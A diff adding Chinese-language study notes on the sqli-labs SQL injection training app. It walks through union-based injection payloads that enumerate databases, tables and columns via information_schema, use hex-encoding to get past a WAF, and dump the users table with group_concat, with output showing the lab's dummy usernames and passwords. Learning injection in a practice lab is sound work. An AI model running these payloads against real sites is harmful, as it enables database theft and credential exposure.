@@ -1,0 +1,56 @@
+<div>参考：<a href="https://zerokeeper.com/web-security/sqlilibs-learning-notes-1-10-off.html">https://zerokeeper.com/web-security/sqlilibs-learning-notes-1-10-off.html</a>
+</div>
+<div>这里需要知道的是，源代码中 id="$id", 这样都是字符型注入</div>
+<h3>获得MYSQL的所有数据库的名字:&#160; information_schema.schemata -&gt; schema_name</h3>
+<div>payload: </div>
+<div>id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+</div>
+<div>可以看到, 下面是一个完整的结果集.</div>
+<pre>CATALOG_NAME	SCHEMA_NAME	DEFAULT_CHARACTER_SET_NAME	DEFAULT_COLLATION_NAME	SQL_PATH
+def	information_schema	utf8	utf8_general_ci	\N
+def	mysql	latin1	latin1_swedish_ci	\N
+def	performance_schema	utf8	utf8_general_ci	\N
+def	security	gbk	gbk_chinese_ci	\N
+def	sqli	gbk	gbk_chinese_ci	\N
+def	sqli_exam	gbk	gbk_chinese_ci	\N
+def	sys	utf8	utf8_general_ci	\N
+</pre>
+<h3>获得security下的所有表的名字 ( information_schema.tables -&gt; table_name )</h3>
+<p>?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema =0x7365637572697479)--+</p>
+<p>上面的 0x73... 就是 security,&#160;&#160; by: &#160; &#160; select CAST(unhex('7365637572697479') AS CHAR(100))&#160; </p>
+<p>这么写的原因估计是为了绕过waf, 使得</p>
+<p>关键语句：select group_concat(table_name) from information_schema.tables where table_schema = 'security'）</p>
+<pre>group_concat(table_name)
+emails,referers,uagents,users</pre>
+<h3>获得 users下的所有的列的名字。 ( information_schema.columns -&gt; column_name) </h3>
+<p>?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema =0x7365637572697479 and table_name=0x7573657273)--+</p>
+<p>或者：</p>
+<p>SELECT GROUP_CONCAT( concat(COLUMN_NAME, " ", data_type), "---") FROM information_schema.`COLUMNS` WHERE TABLE_NAME = 'users' AND table_schema = 'security'</p>
+<pre>GROUP_CONCAT( concat(COLUMN_NAME, " ", data_type), "---")
+id int---,username varchar---,password varchar---
+</pre>
+<h3>获得users表下的所有内容 ( 使用 union select , 然后在后者中，使用 group_concat 和 concat ) </h3>
+<p>SELECT * FROM security.users WHERE id = '-1' UNION SELECT 1, (SELECT GROUP_CONCAT(CONCAT(id, ",", username, ",", PASSWORD), "==") FROM users), 3 FROM users;</p>
+<p>原内容：（多行）</p>
+<pre>id	username	password
+1	Dumb	Dumb
+2	Angelina	I-kill-you
+3	Dummy	p@ssword
+4	secure	crappy
+5	stupid	stupidity
+6	superman	genious
+7	batman	mob!le
+8	admin	admin
+9	admin1	admin1
+10	admin2	admin2
+11	admin3	admin3
+12	dhakkan	dumbo
+14	admin4	admin4</pre>
+<p>我们需要使用 group_concat 把内容在一行内展示出来：</p>
+<pre>id	username	password
+1	1,Dumb,Dumb==,2,Angelina,I-kill-you==,3,Dummy,p@ssword==,4,secure,crappy==,5,stupid,stupidity==,6,superman,genious==,7,batman,mob!le==,8,admin,admin==,9,admin1,admin1==,10,admin2,admin2==,11,admin3,admin3==,12,dhakkan,dumbo==,14,admin4,admin4==	3
+</pre>
+<h3>获得数据库信息（版本号 version(), 数据库信息&#160; database()）</h3>
+<p>SELECT * FROM users WHERE id = '-1' UNION SELECT 1, VERSION(), DATABASE()</p>
+<pre>id	username	password
+1	5.7.26-log	sqli
+</pre>
